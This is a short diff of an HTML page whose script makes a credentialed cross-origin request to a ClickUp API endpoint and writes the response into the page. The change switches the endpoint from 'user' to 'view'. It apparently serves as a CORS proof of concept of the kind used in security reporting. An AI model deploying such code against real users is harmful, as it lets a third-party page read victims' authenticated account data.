@@ -9,7 +9,7 @@ div {text-align: center;}
     <body>
       <script>
 var xhr = new XMLHttpRequest();
-xhr.open('GET', "https://app.clickup.com/v1/user");
+xhr.open('GET', "https://app.clickup.com/v1/view");
 xhr.withCredentials = true;
 xhr.onload = function () {
     document.write(this.response)
